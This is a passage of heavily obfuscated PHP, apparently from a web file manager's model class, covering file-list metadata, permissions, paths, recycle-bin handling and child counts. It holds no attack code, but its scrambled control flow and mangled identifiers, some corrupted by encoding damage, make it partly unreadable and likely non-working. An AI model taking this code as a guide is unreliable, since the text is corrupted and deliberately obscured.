array_keys($FË˜™ÀÄ­¯))) { $DÏÜùÑ¢â = $cŸ½õéÉ†[398]; } goto cˆí””Ê…; AÅˆ¾…: $FË˜™ÀÄ­¯ = array($cŸ½õéÉ†[398] => $cŸ½õéÉ†[399], $cŸ½õéÉ†[400] => $cŸ½õéÉ†[401]); $Aá¹æÁÅÕí = array($cŸ½õéÉ†[28] => $cŸ½õéÉ†[28], $cŸ½õéÉ†[77] => $cŸ½õéÉ†[77], $cŸ½õéÉ†[157] => $cŸ½õéÉ†[369], $cŸ½õéÉ†[375] => $cŸ½õéÉ†[375], $cŸ½õéÉ†[402] => $cŸ½õéÉ†[376], $cŸ½õéÉ†[184] => $cŸ½õéÉ†[184], $cŸ½õéÉ†[107] => $cŸ½õéÉ†[107]); $DÏÜùÑ¢â = Input::get($cŸ½õéÉ†[403], $cŸ½õéÉ†[7], $F¬°ôíÏ, array_keys($Aá¹æÁÅÕí)); goto C‹³Õ‡¿ìè; b†Êğíºİ³: } protected function _listDataApplyItem($f²ˆâ×àâ§, $E™Ìí“ÄÓÕ = false) { $bÌĞ©Û…¦‚ = array($f²ˆâ×àâ§); $this->_listDataApply($bÌĞ©Û…¦‚, $E™Ìí“ÄÓÕ); return $bÌĞ©Û…¦‚[0]; } protected function _listDataApply(&$A™½±®®¤, $fõĞ©‚Ğâ¼ = false) { goto aø×ŞÎÃé; aø×ŞÎÃé: $A…µ—ÕŠÓå =& $_SERVER[¼]; if (!$A™½±®®¤) { $A™½±®®¤ = array(); return; } $fÁòÕˆ¢ = array_to_keyvalue($A™½±®®¤, $A…µ—ÕŠÓå[33], $A…µ—ÕŠÓå[366]); goto F¥Ğë·áÑé; dŞ¥Ù‰Ê¦: $this->_listAppendPath($A™½±®®¤); $this->_listAppendAuth($A™½±®®¤); $this->_listAppendSourceInfo($A™½±®®¤, $fÁòÕˆ¢); goto Bë¯Ãºà‰Ó; F¥Ğë·áÑé: $fÁòÕˆ¢ = array_unique($fÁòÕˆ¢); $this->_listSourceCache($A™½±®®¤); if (!$fõĞ©‚Ğâ¼) { $this->_listAppendMeta($A™½±®®¤, $fÁòÕˆ¢); $this->_listAppendFileMeta($A™½±®®¤, $fÁòÕˆ¢); $this->_listAppendChildren($A™½±®®¤, $fÁòÕˆ¢); } goto dŞ¥Ù‰Ê¦; Bë¯Ãºà‰Ó: $this->_listAppendUser($A™½±®®¤); $this->_listFilterInfo($A™½±®®¤, $fõĞ©‚Ğâ¼); goto d¯¯„ä´ò»; d¯¯„ä´ò»: } protected function _listSourceCache($e¥‚×ò‘) { $bœ¼âà¼ã© =& $_SERVER[¼]; foreach ($e¥‚×ò‘ as $Bºƒš³ñ¥á) { self::$cacheSourceInfo[$bœ¼âà¼ã©[406] . $Bºƒš³ñ¥á[$bœ¼âà¼ã©[366]]] = $Bºƒš³ñ¥á; } } protected function _listFilterInfo(&$D“†ôğà‚´, $F”âî¿ª = false) { $Cæğ¯Ô¤´Í =& $_SERVER[¼]; foreach ($D“†ôğà‚´ as &$D”§¾ŞòôÎ) { $D”§¾ŞòôÎ = $this->pathInfoFilter($D”§¾ŞòôÎ); self::$cachePathInfo[$Cæğ¯Ô¤´Í[407] . intval($F”âî¿ª) . $Cæğ¯Ô¤´Í[408] . $D”§¾ŞòôÎ[$Cæğ¯Ô¤´Í[366]]] = $D”§¾ŞòôÎ; } } protected function _listMake(&$F¤÷Û‹ƒ¡Ñ) { $EÑŒ“ÊŒÊ =& $_SERVER[¼]; $F¤÷Û‹ƒ¡Ñ[$EÑŒ“ÊŒÊ[74]] = array(); $F¤÷Û‹ƒ¡Ñ[$EÑŒ“ÊŒÊ[73]] = array(); foreach ($F¤÷Û‹ƒ¡Ñ[$EÑŒ“ÊŒÊ[351]] as $c¦ÜëÄ­ˆ) { $bïùÉ”‹ğ = $c¦ÜëÄ­ˆ[$EÑŒ“ÊŒÊ[367]] == 1 ? $EÑŒ“ÊŒÊ[74] : $EÑŒ“ÊŒÊ[73]; $F¤÷Û‹ƒ¡Ñ[$bïùÉ”‹ğ][] = $c¦ÜëÄ­ˆ; } unset($F¤÷Û‹ƒ¡Ñ[$EÑŒ“ÊŒÊ[351]]); } protected function _listAppendMeta(&$E„Ùµäµï‹, $dƒÖÆŞò†) { goto F¨“›¹¤ÉŠ; e•¯ö»¿Îä: if (!$c·ÓÖæÕ×¾) { return; } $B±Ğ¥óİ† = array($FÏ¨±óÚŠ [411], $FÏ¨±óÚŠ [412]); $EÙñ‡‰º¤õ = array(); goto Cº¡îÀùÆ½; F¨“›¹¤ÉŠ: $FÏ¨±óÚŠ  =& $_SERVER[¼]; $Ağº…ö‰ÕÊ = array($FÏ¨±óÚŠ [380] => array($FÏ¨±óÚŠ [381], $dƒÖÆŞò†)); $c·ÓÖæÕ×¾ = Model($FÏ¨±óÚŠ [409])->field($FÏ¨±óÚŠ [410])->where($Ağº…ö‰ÕÊ)->select(); goto e•¯ö»¿Îä; Cº¡îÀùÆ½: foreach ($c·ÓÖæÕ×¾ as $b„×öÅ‡º) { if (!isset($EÙñ‡‰º¤õ[$b„×öÅ‡º[$FÏ¨±óÚŠ [366]]])) { $EÙñ‡‰º¤õ[$b„×öÅ‡º[$FÏ¨±óÚŠ [366]]] = array(); } if (in_array($b„×öÅ‡º[$FÏ¨±óÚŠ [89]], $B±Ğ¥óİ†)) { continue; } $EÙñ‡‰º¤õ[$b„×öÅ‡º[$FÏ¨±óÚŠ [366]]][$b„×öÅ‡º[$FÏ¨±óÚŠ [89]]] = $b„×öÅ‡º[$FÏ¨±óÚŠ [356]]; } foreach ($E„Ùµäµï‹ as &$AÃãÈ´ßÉ) { $AÃãÈ´ßÉ[$FÏ¨±óÚŠ [413]] = !1; if (isset($EÙñ‡‰º¤õ[$AÃãÈ´ßÉ[$FÏ¨±óÚŠ [366]]])) { $AÃãÈ´ßÉ[$FÏ¨±óÚŠ [413]] = $EÙñ‡‰º¤õ[$AÃãÈ´ßÉ[$FÏ¨±óÚŠ [366]]]; } if ($this->fileIsLock($AÃãÈ´ßÉ) && $AÃãÈ´ßÉ[$FÏ¨±óÚŠ [373]]) { $Cõó°ï = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $AÃãÈ´ßÉ[$FÏ¨±óÚŠ [373]][$FÏ¨±óÚŠ [374]] = AuthModel::authDisable($AÃãÈ´ßÉ[$FÏ¨±óÚŠ [373]][$FÏ¨±óÚŠ [374]], $Cõó°ï); $AÃãÈ´ßÉ[$FÏ¨±óÚŠ [373]][$FÏ¨±óÚŠ [414]][$FÏ¨±óÚŠ [373]] = $AÃãÈ´ßÉ[$FÏ¨±óÚŠ [373]][$FÏ¨±óÚŠ [374]]; } } goto fŒœƒß°¡õ; fŒœƒß°¡õ: } protected function _listAppendFileMeta(&$FÄÍÏ”ëä, $B«êÄ´Œİ) { goto D³ŒçÉÆ‹Á; eƒõ™˜¹‹‹: $cö½µœÄ—‘ = $cö½µœÄ—‘ ? $cö½µœÄ—‘ : array(); $A°¯œ„…‡Ë = array(); foreach ($cö½µœÄ—‘ as $F½·‰Ğæò) { if (!isset($A°¯œ„…‡Ë[$F½·‰Ğæò[$DÚ•æ«ˆÃÆ[415]]])) { $A°¯œ„…‡Ë[$F½·‰Ğæò[$DÚ•æ«ˆÃÆ[415]]] = array(); } $A°¯œ„…‡Ë[$F½·‰Ğæò[$DÚ•æ«ˆÃÆ[415]]][$F½·‰Ğæò[$DÚ•æ«ˆÃÆ[89]]] = $F½·‰Ğæò[$DÚ•æ«ˆÃÆ[356]]; } goto D·ŠÕÂ£×°; D³ŒçÉÆ‹Á: $DÚ•æ«ˆÃÆ =& $_SERVER[¼]; $Bâ¼ĞŞ”ù = array_to_keyvalue($FÄÍÏ”ëä, $DÚ•æ«ˆÃÆ[33], $DÚ•æ«ˆÃÆ[415]); $Bâ¼ĞŞ”ù = array_filter(array_unique($Bâ¼ĞŞ”ù)); goto f…ğÌãğ½‡; f…ğÌãğ½‡: if (!$Bâ¼ĞŞ”ù) { return; } $EÖËŸĞÛ‹ = array($DÚ•æ«ˆÃÆ[416] => array($DÚ•æ«ˆÃÆ[381], $Bâ¼ĞŞ”ù)); $F“ô¦éÁŒ° = $DÚ•æ«ˆÃÆ[417]; goto DĞ†ì¼ºŸ; D·ŠÕÂ£×°: foreach ($FÄÍÏ”ëä as &$DëÁ·ä‘‰“) { goto B¦½Ø“ˆìÕ; B¦½Ø“ˆìÕ: $CïÔâ¡’Á = $DëÁ·ä‘‰“[$DÚ•æ«ˆÃÆ[415]]; if (!$CïÔâ¡’Á || !isset($eãã’’ ñ»[$CïÔâ¡’Á])) { continue; } $fÊ‚¡°¹À­ = $eãã’’ ñ»[$CïÔâ¡’Á]; goto AŠ£ƒ½Şî; AŠ£ƒ½Şî: $fÊ‚¡°¹À­[$DÚ•æ«ˆÃÆ[77]] = $DëÁ·ä‘‰“[$DÚ•æ«ˆÃÆ[77]]; $fÊ‚¡°¹À­[$DÚ•æ«ˆÃÆ[28]] = $DëÁ·ä‘‰“[$DÚ•æ«ˆÃÆ[28]]; self::$cacheFileInfo[$DÚ•æ«ˆÃÆ[421] . $CïÔâ¡’Á] = $fÊ‚¡°¹À­; goto DÄĞÆ£…ÈÜ; DÄĞÆ£…ÈÜ: unset($eãã’’ ñ»[$CïÔâ¡’Á][$DÚ•æ«ˆÃÆ[75]]); $F„¶àñƒ· = is_array($A°¯œ„…‡Ë[$CïÔâ¡’Á]) ? $A°¯œ„…‡Ë[$CïÔâ¡’Á] : array(); $DëÁ·ä‘‰“[$DÚ•æ«ˆÃÆ[159]] = array_merge($F„¶àñƒ·, $eãã’’ ñ»[$CïÔâ¡’Á]); goto d¡ä›ÁÈš•; d¡ä›ÁÈš•: if (isset($DëÁ·ä‘‰“[$DÚ•æ«ˆÃÆ[159]][$DÚ•æ«ˆÃÆ[422]])) { $DëÁ·ä‘‰“[$DÚ•æ«ˆÃÆ[422]] = json_decode($DëÁ·ä‘‰“[$DÚ•æ«ˆÃÆ[159]][$DÚ•æ«ˆÃÆ[422]], !0); unset($DëÁ·ä‘‰“[$DÚ•æ«ˆÃÆ[159]][$DÚ•æ«ˆÃÆ[422]]); } goto a¶ÎŸøˆŠâ; a¶ÎŸøˆŠâ: } goto aöŒê¨¶; DĞ†ì¼ºŸ: $eãã’’ ñ» = Model($DÚ•æ«ˆÃÆ[418])->field($F“ô¦éÁŒ°)->where($EÖËŸĞÛ‹)->select(); $eãã’’ ñ» = array_to_keyvalue($eãã’’ ñ», $DÚ•æ«ˆÃÆ[415]); $cö½µœÄ—‘ = Model($DÚ•æ«ˆÃÆ[419])->field($DÚ•æ«ˆÃÆ[420])->where($EÖËŸĞÛ‹)->select(); goto eƒõ™˜¹‹‹; aöŒê¨¶: } protected function _listAppendSourceInfo(&$BÂˆ¯âßŸ, $fÄŸóØ·Š‘) { goto D–õì²ŞËˆ; f²Ë¯£àé: $cŠÉÓƒçÔ = array_to_keyvalue($Cœ¿ÂØ˜§Ø, $D¾ĞçåóÆ[364]); $Aˆ†œœÀİº = array_to_keyvalue_group($aëË¯ã‚„´, $D¾ĞçåóÆ[75], $D¾ĞçåóÆ[390]); $Eªº¼ó“õÏ = array_to_keyvalue($D†ˆòóÉÔ, $D¾ĞçåóÆ[75]); goto fÚÄ±õò˜¶; f–Ãğ‘ãµ‰: $aëË¯ã‚„´ = Model($D¾ĞçåóÆ[389])->listData(); $D†ˆòóÉÔ = Model($D¾ĞçåóÆ[378])->listData(); $bå©†ÚÀèù = Model($D¾ĞçåóÆ[425])->listSimple(); goto f²Ë¯£àé; D–õì²ŞËˆ: $D¾ĞçåóÆ =& $_SERVER[¼]; if (!defined($D¾ĞçåóÆ[423])) { return; } $Cœ¿ÂØ˜§Ø = Model($D¾ĞçåóÆ[424])->listData(); goto f–Ãğ‘ãµ‰; fÚÄ±õò˜¶: $A¼‡öœ‰¯ = array_to_keyvalue_group($bå©†ÚÀèù, $D¾ĞçåóÆ[366]); foreach ($BÂˆ¯âßŸ as &$f…±ÇÜáŞİ) { $f…±ÇÜáŞİ[$D¾ĞçåóÆ[388]] = array($D¾ĞçåóÆ[426] => 0, $D¾ĞçåóÆ[427] => 0, $D¾ĞçåóÆ[428] => 0); if (isset($Eªº¼ó“õÏ[$f…±ÇÜáŞİ[$D¾ĞçåóÆ[366]]])) { $f…±ÇÜáŞİ[$D¾ĞçåóÆ[388]][$D¾ĞçåóÆ[429]] = 1; $f…±ÇÜáŞİ[$D¾ĞçåóÆ[388]][$D¾ĞçåóÆ[430]] = $Eªº¼ó“õÏ[$f…±ÇÜáŞİ[$D¾ĞçåóÆ[366]]][$D¾ĞçåóÆ[28]]; } if (isset($Aˆ†œœÀİº[$f…±ÇÜáŞİ[$D¾ĞçåóÆ[366]]])) { $f…±ÇÜáŞİ[$D¾ĞçåóÆ[388]][$D¾ĞçåóÆ[431]] = array(); foreach ($Aˆ†œœÀİº[$f…±ÇÜáŞİ[$D¾ĞçåóÆ[366]]] as $FÆ›Ş¨·Å) { $e±ÏÉ×ƒ©Œ = $cŠÉÓƒçÔ[$FÆ›Ş¨·Å]; $f…±ÇÜáŞİ[$D¾ĞçåóÆ[388]][$D¾ĞçåóÆ[431]][] = array($D¾ĞçåóÆ[432] => $e±ÏÉ×ƒ©Œ[$D¾ĞçåóÆ[364]], $D¾ĞçåóÆ[383] => $e±ÏÉ×ƒ©Œ[$D¾ĞçåóÆ[28]], $D¾ĞçåóÆ[433] => $e±ÏÉ×ƒ©Œ[$D¾ĞçåóÆ[434]]); } } if (isset($A¼‡öœ‰¯[$f…±ÇÜáŞİ[$D¾ĞçåóÆ[366]]])) { $f…±ÇÜáŞİ[$D¾ĞçåóÆ[388]][$D¾ĞçåóÆ[435]] = array(); foreach ($A¼‡öœ‰¯[$f…±ÇÜáŞİ[$D¾ĞçåóÆ[366]]] as $E™Ç¬Á‰«ã) { $f…±ÇÜáŞİ[$D¾ĞçåóÆ[388]][$D¾ĞçåóÆ[435]] = array($D¾ĞçåóÆ[436] => $E™Ç¬Á‰«ã[$D¾ĞçåóÆ[437]], $D¾ĞçåóÆ[438] => $E™Ç¬Á‰«ã[$D¾ĞçåóÆ[439]], $D¾ĞçåóÆ[440] => $E™Ç¬Á‰«ã[$D¾ĞçåóÆ[366]], $D¾ĞçåóÆ[441] => $E™Ç¬Á‰«ã[$D¾ĞçåóÆ[442]], $D¾ĞçåóÆ[443] => $E™Ç¬Á‰«ã[$D¾ĞçåóÆ[444]]); } } } return $BÂˆ¯âßŸ; goto eÊÃö¡ÖÇÌ; eÊÃö¡ÖÇÌ: } protected function _listAppendChildren(&$eÇ½Â«é·, $CÑĞ£±Ùƒç) { goto EŞäå—à˜†; AÙœ¹ÆŒ‰£: $f§ë´ÆÑŞ¨ = $this->tablePrefix . $this->tableName; for ($CÜœŒëˆœ¢ = 0; $CÜœŒëˆœ¢ < $fÈË·èò ; $CÜœŒëˆœ¢++) { $eˆ¦…É = intval($eÇ½Â«é·[$CÜœŒëˆœ¢][$C¶ÇÃÊİåŒ[393]]); if ($eÇ½Â«é·[$CÜœŒëˆœ¢][$C¶ÇÃÊİåŒ[367]]) { $BêƒÜ„«ŸŒ = $eÇ½Â«é·[$CÜœŒëˆœ¢][$C¶ÇÃÊİåŒ[366]]; $AöÃÔÍ–Ş .= "\x53\x45\x4c\x45\103\x54\40\x2a\40\106\x52\117\115\x20\50\x53\105\x4c\x45\x43\x54\x20\x27{$BêƒÜ„«ŸŒ}\x5f\x68\141\163\106\151\x6c\145\x27\40\141\163\40\x68\141\163\54\143\x6f\x75\x6e\x74\x28\61\x29\40\x61\x73\40\x68\141\x73\103\x6f\x75\x6e\164\x20\x46\122\117\115\x20\x60{$f§ë´ÆÑŞ¨}\x60\x20\xa\x9\x9\11\x9\11\167\150\145\162\x65\40\160\x61\x72\x65\156\x74\111\x44\75{$BêƒÜ„«ŸŒ}\40\141\x6e\x64\40\151\x73\106\x6f\154\x64\145\162\x3d\x30\40\x61\x6e\144\40\x69\163\104\x65\154\x65\164\x65\x3d{$eˆ¦…É}\51\x20\x61\x73\40\164\x62\x31\x5f{$BêƒÜ„«ŸŒ}\40\165\156\x69\157\156\40\141\154\x6c\x20\12\x9\x9\11\x9\x9\x53\x45\x4c\x45\103\124\x20\x2a\x20\106\x52\x4f\115\40\50\x53\105\114\105\x43\x54\40\x27{$BêƒÜ„«ŸŒ}\x5f\x68\x61\163\x46\x6f\x6c\x64\145\162\x27\x20\x61\x73\40\150\141\163\106\151\154\145\54\143\x6f\x75\156\x74\50\x31\x29\40\x61\163\40\x68\141\163\x43\157\165\x6e\x74\x20\x46\x52\x4f\x4d\40\x60{$f§ë´ÆÑŞ¨}\x60\x20\xa\11\x9\x9\11\11\167\150\x65\162\x65\40\x70\141\162\145\156\x74\x49\104\75{$BêƒÜ„«ŸŒ}\40\141\x6e\144\40\x69\163\106\x6f\154\x64\145\x72\75\x31\40\141\x6e\144\40\x69\163\104\145\x6c\x65\x74\x65\75{$eˆ¦…É}\51\x20\x61\163\x20\x74\x62\x32\x5f{$BêƒÜ„«ŸŒ}\x20\165\x6e\151\x6f\156\40\141\x6c\154\x20"; } if ((strlen($AöÃÔÍ–Ş) >= $Fß×º„¦Óİ || $CÜœŒëˆœ¢ == $fÈË·èò  - 1) && $AöÃÔÍ–Ş) { $AöÃÔÍ–Ş = substr($AöÃÔÍ–Ş, 0, -strlen($C¶ÇÃÊİåŒ[445])); $AããËÂ¡ñØ = $this->query($AöÃÔÍ–Ş); $Dã…§æ™¹ = array_merge($Dã…§æ™¹, $AããËÂ¡ñØ); $AöÃÔÍ–Ş = $C¶ÇÃÊİåŒ[33]; } } $Dã…§æ™¹ = array_to_keyvalue($Dã…§æ™¹, $C¶ÇÃÊİåŒ[446]); goto f°™¹„Ëñ–; EŞäå—à˜†: $C¶ÇÃÊİåŒ =& $_SERVER[¼]; $AöÃÔÍ–Ş = $C¶ÇÃÊİåŒ[358]; $Dã…§æ™¹ = array(); goto DÅ­ßÅƒ¶; DÅ­ßÅƒ¶: $Fß×º„¦Óİ = 1024 * 50; $eÇ½Â«é· = is_array($eÇ½Â«é·) ? $eÇ½Â«é· : array(); $fÈË·èò  = count($eÇ½Â«é·); goto AÙœ¹ÆŒ‰£; f°™¹„Ëñ–: foreach ($eÇ½Â«é· as &$e”ğØˆ·ê) { if ($e”ğØˆ·ê[$C¶ÇÃÊİåŒ[367]]) { unset($e”ğØˆ·ê[$C¶ÇÃÊİåŒ[369]]); $e”ğØˆ·ê[$C¶ÇÃÊİåŒ[189]] = intval($Dã…§æ™¹[$e”ğØˆ·ê[$C¶ÇÃÊİåŒ[366]] . $C¶ÇÃÊİåŒ[447]][$C¶ÇÃÊİåŒ[448]]); $e”ğØˆ·ê[$C¶ÇÃÊİåŒ[188]] = intval($Dã…§æ™¹[$e”ğØˆ·ê[$C¶ÇÃÊİåŒ[366]] . $C¶ÇÃÊİåŒ[449]][$C¶ÇÃÊİåŒ[448]]); } } goto E•¥¯ß—†; E•¥¯ß—†: } protected function _listAppendAuth(&$fæŠÏ£÷¦Ü) { goto få»…ùˆÔæ; D³™¼ŸÏ¦Ò: foreach ($fæŠÏ£÷¦Ü as $eÖÛª¤â¶ì) { if ($eÖÛª¤â¶ì[$aÅÊ¼Ã‡è‘[368]] == self::TYPE_GROUP) { $Eğ‡Ñ÷Ãõ[] = $eÖÛª¤â¶ì[$aÅÊ¼Ã‡è‘[366]]; } } if (!$Eğ‡Ñ÷Ãõ) { return; } $c¦˜ïæÇªÅ = array_to_keyvalue($fæŠÏ£÷¦Ü, $aÅÊ¼Ã‡è‘[366]); goto b›‹Ğ·Û˜—; få»…ùˆÔæ: $aÅÊ¼Ã‡è‘ =& $_SERVER[¼]; if (!defined($aÅÊ¼Ã‡è‘[423])) { return; } $Eğ‡Ñ÷Ãõ = array(); goto D³™¼ŸÏ¦Ò; b›‹Ğ·Û˜—: $F«²¼Íî®§ = Model($aÅÊ¼Ã‡è‘[450])->getSourceList($Eğ‡Ñ÷Ãõ, $c¦˜ïæÇªÅ); foreach ($fæŠÏ£÷¦Ü as $eÍà®å·Å¹ => &$eÖÛª¤â¶ì) { $eÖÛª¤â¶ì[$aÅÊ¼Ã‡è‘[373]] = $F«²¼Íî®§[$eÖÛª¤â¶ì[$aÅÊ¼Ã‡è‘[366]]]; if (!$eÖÛª¤â¶ì[$aÅÊ¼Ã‡è‘[373]] && $eÖÛª¤â¶ì[$aÅÊ¼Ã‡è‘[368]] == self::TYPE_GROUP) { $eÖÛª¤â¶ì[$aÅÊ¼Ã‡è‘[373]] = Action($aÅÊ¼Ã‡è‘[451])->pathGroupAuthMake($eÖÛª¤â¶ì[$aÅÊ¼Ã‡è‘[452]]); if (!$eÖÛª¤â¶ì[$aÅÊ¼Ã‡è‘[373]] && !_get($GLOBALS, $aÅÊ¼Ã‡è‘[453])) { $eÖÛª¤â¶ì[$aÅÊ¼Ã‡è‘[186]] = !1; $eÖÛª¤â¶ì[$aÅÊ¼Ã‡è‘[185]] = !1; } } if ($eÖÛª¤â¶ì[$aÅÊ¼Ã‡è‘[373]]) { $eÖÛª¤â¶ì[$aÅÊ¼Ã‡è‘[186]] = AuthModel::authCheckEdit($eÖÛª¤â¶ì[$aÅÊ¼Ã‡è‘[373]][$aÅÊ¼Ã‡è‘[374]]); $eÖÛª¤â¶ì[$aÅÊ¼Ã‡è‘[185]] = AuthModel::authCheckView($eÖÛª¤â¶ì[$aÅÊ¼Ã‡è‘[373]][$aÅÊ¼Ã‡è‘[374]]); } $this->groupPathDisplay($eÖÛª¤â¶ì); } goto BÖ¡ğ´šÚ; BÖ¡ğ´šÚ: } public function groupPathDisplay(&$c”„¿ª¤—¾) { goto c´ øòÍÓÀ; A–Åœ”æ¨»: $c”„¿ª¤—¾[$a÷ÍÒ™Ù«Ñ[460]] = $C”é™¤«·Ö . $A¨ÃÛÏ«[$a÷ÍÒ™Ù«Ñ[388]][$a÷ÍÒ™Ù«Ñ[366]]; goto eµÆÒ —«‰; fƒ£µõÙÄê: $c”„¿ª¤—¾[$a÷ÍÒ™Ù«Ñ[456]] = $A¨ÃÛÏ«[$a÷ÍÒ™Ù«Ñ[457]]; $c”„¿ª¤—¾[$a÷ÍÒ™Ù«Ñ[377]] = $A¨ÃÛÏ«[$a÷ÍÒ™Ù«Ñ[455]]; $c”„¿ª¤—¾[$a÷ÍÒ™Ù«Ñ[458]] = $A¨ÃÛÏ«[$a÷ÍÒ™Ù«Ñ[459]]; goto A–Åœ”æ¨»; f…Û…íÜ¯†: $b†¼‘ˆ½É¿ = $this->parentLevelArray($A¨ÃÛÏ«[$a÷ÍÒ™Ù«Ñ[455]]); $C”é™¤«·Ö = $a÷ÍÒ™Ù«Ñ[33]; foreach ($b†¼‘ˆ½É¿ as $BÛô¢„Á´Ë) { $F‰ÇŒ¡¬Éâ = Model($a÷ÍÒ™Ù«Ñ[454])->getInfo($BÛô¢„Á´Ë); $C”é™¤«·Ö .= $F‰ÇŒ¡¬Éâ[$a÷ÍÒ™Ù«Ñ[388]][$a÷ÍÒ™Ù«Ñ[366]] . $a÷ÍÒ™Ù«Ñ[47]; } goto fƒ£µõÙÄê; c´ øòÍÓÀ: $a÷ÍÒ™Ù«Ñ =& $_SERVER[¼]; if ($c”„¿ª¤—¾[$a÷ÍÒ™Ù«Ñ[368]] != self::TYPE_GROUP) { return; } $A¨ÃÛÏ« = Model($a÷ÍÒ™Ù«Ñ[454])->getInfo($c”„¿ª¤—¾[$a÷ÍÒ™Ù«Ñ[452]]); goto f…Û…íÜ¯†; eµÆÒ —«‰: } protected function _listAppendPath(&$D—®ˆ©‡é¢) { goto cËÈ³ô¼‚³; Bì«Ç¨µÚ: $Cø°·ö•õŒ = array(); foreach ($cš÷„Ò½¸¨ as $EÔâÁÒ÷„ù => $E°¯‘ß¹¡Ò) { if (!$E°¯‘ß¹¡Ò) { $Cø°·ö•õŒ[] = $EÔâÁÒ÷„ù; } } if ($Cø°·ö•õŒ) { $C•·ÙÄ—ºò = array($Cù ÛŠŒ‰¢[380] => array($Cù ÛŠŒ‰¢[381], $Cø°·ö•õŒ)); if (count($Cø°·ö•õŒ) == 1) { $c‹³ÍÀÆÉÓ = $this->sourceInfo($Cø°·ö•õŒ[0]); $c‹³ÍÀÆÉÓ = is_array($c‹³ÍÀÆÉÓ) ? array($c‹³ÍÀÆÉÓ) : !1; } else { $c‹³ÍÀÆÉÓ = $this->field($Cù ÛŠŒ‰¢[461])->where($C•·ÙÄ—ºò)->select(); } $a—šĞ»•»ˆ = array_to_keyvalue($c‹³ÍÀÆÉÓ, $Cù ÛŠŒ‰¢[366], $Cù ÛŠŒ‰¢[28]); $cš÷„Ò½¸¨ = array_merge_index($cš÷„Ò½¸¨, $a—šĞ»•»ˆ); } goto f‚ÄÍõé×’; f‚ÄÍõé×’: $A„ì»çöùã = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); foreach ($D—®ˆ©‡é¢ as &$bñ°¿Ï™×—) { goto DÖ½å¼¥«ô; D™á³–±¢ò: if ($dæºáÓ‘è¯) { $AÄ´ôÈÆÁ¼ .= $bñ°¿Ï™×—[$Cù ÛŠŒ‰¢[28]]; } if ($bñ°¿Ï™×—[$Cù ÛŠŒ‰¢[367]]) { $AÄ´ôÈÆÁ¼ .= $Cù ÛŠŒ‰¢[8]; } $bñ°¿Ï™×—[$Cù ÛŠŒ‰¢[462]] = str_replace($Cù ÛŠŒ‰¢[463], $Cù ÛŠŒ‰¢[8], $AÄ´ôÈÆÁ¼); goto eŞ«½ùÍÊÍ; DÖ½å¼¥«ô: $dæºáÓ‘è¯ = $this->parentLevelArray($bñ°¿Ï™×—[$Cù ÛŠŒ‰¢[455]]); $AÄ´ôÈÆÁ¼ = $this->_listAppendPathRoot($bñ°¿Ï™×—, $dæºáÓ‘è¯); foreach ($dæºáÓ‘è¯ as $a‡¹‚†‚×) { if (isset($cš÷„Ò½¸¨[$a‡¹‚†‚×])) { $AÄ´ôÈÆÁ¼ .= $cš÷„Ò½¸¨[$a‡¹‚†‚×] . $Cù ÛŠŒ‰¢[8]; } } goto D™á³–±¢ò; eŞ«½ùÍÊÍ: $AÜÃ„óİ³ë = trim($bñ°¿Ï™×—[$Cù ÛŠŒ‰¢[462]], $Cù ÛŠŒ‰¢[8]); if ($bñ°¿Ï™×—[$Cù ÛŠŒ‰¢[457]] == $Cù ÛŠŒ‰¢[464] && $AÜÃ„óİ³ë) { $bñ°¿Ï™×—[$Cù ÛŠŒ‰¢[28]] = $AÜÃ„óİ³ë; } $this->_listAppendPathRecycle($bñ°¿Ï™×—, $dæºáÓ‘è¯, $A„ì»çöùã); goto E‡¦Œ—«æ; E‡¦Œ—«æ: } goto Fè¶µ‘±³º; cËÈ³ô¼‚³: $Cù ÛŠŒ‰¢ =& $_SERVER[¼]; $cš÷„Ò½¸¨ = array(); foreach ($D—®ˆ©‡é¢ as &$bñ°¿Ï™×—) { $cš÷„Ò½¸¨[$bñ°¿Ï™×—[$Cù ÛŠŒ‰¢[366]]] = $bñ°¿Ï™×—[$Cù ÛŠŒ‰¢[28]]; $dæºáÓ‘è¯ = $this->parentLevelArray($bñ°¿Ï™×—[$Cù ÛŠŒ‰¢[455]]); array_shift($dæºáÓ‘è¯); foreach ($dæºáÓ‘è¯ as $a‡¹‚†‚×) { if (!isset($cš÷„Ò½¸¨[$a‡¹‚†‚×])) { $cš÷„Ò½¸¨[$a‡¹‚†‚×] = 0; } } } goto Bì«Ç¨µÚ; Fè¶µ‘±³º: } private function _listAppendPathRecycle(&$FÈ¹ÏŒ, $FÉªÜ»—ÔÔ, $bš­Å¼çÇ‚) { goto cÜ‡µ¸Î„ù; cÜ‡µ¸Î„ù: $f…³“÷¦ =& $_SERVER[¼]; if (intval($FÈ¹ÏŒ[$f…³“÷¦[368]]) !== self::TYPE_SYSTEM) { return; } if (!in_array($bš­Å¼çÇ‚, $FÉªÜ»—ÔÔ) && $FÈ¹ÏŒ[$f…³“÷¦[366]] != $bš­Å¼çÇ‚) { return; } goto Dğ±«éÖŒ; cé†Àåë”ß: $FÈ¹ÏŒ[$f…³“÷¦[455]] = $f…³“÷¦[466] . implode($f…³“÷¦[47], array_slice($FÉªÜ»—ÔÔ, 1)) . $f…³“÷¦[47]; if ($FÈ¹ÏŒ[$f…³“÷¦[366]] == $bš­Å¼çÇ‚) { $FÈ¹ÏŒ[$f…³“÷¦[455]] = $f…³“÷¦[466]; $FÈ¹ÏŒ[$f…³“÷¦[457]] = $f…³“÷¦[464]; $FÈ¹ÏŒ[$f…³“÷¦[28]] = LNG($f…³“÷¦[465]); } $FÈ¹ÏŒ[$f…³“÷¦[467]] = $f…³“÷¦[468]; goto cãÎŠËî; Dğ±«éÖŒ: $Eé’à®Š = explode($f…³“÷¦[8], trim($FÈ¹ÏŒ[$f…³“÷¦[462]], $f…³“÷¦[8])); $b»šò’æó = implode($f…³“÷¦[8], array_slice($Eé’à®Š, 2)); $FÈ¹ÏŒ[$f…³“÷¦[462]] = $f…³“÷¦[8] . LNG($f…³“÷¦[465]) . $f…³“÷¦[8] . ltrim($b»šò’æó, $f…³“÷¦[8]); goto cé†Àåë”ß; cãÎŠËî: } protected function _listAppendPathRoot(&$eÕõ»¸ë‘°, $CíÃÆ‹²Ø) { $bÁˆÁÉƒŠÌ =& $_SERVER[¼]; $CæšøèØÕ‘ = $bÁˆÁÉƒŠÌ[33]; if ($eÕõ»¸ë‘°[$bÁˆÁÉƒŠÌ[368]] == self::TYPE_USER) { if (defined($bÁˆÁÉƒŠÌ[423]) && $eÕõ»¸ë‘°[$bÁˆÁÉƒŠÌ[452]] == USER_ID) { $CæšøèØÕ‘ = 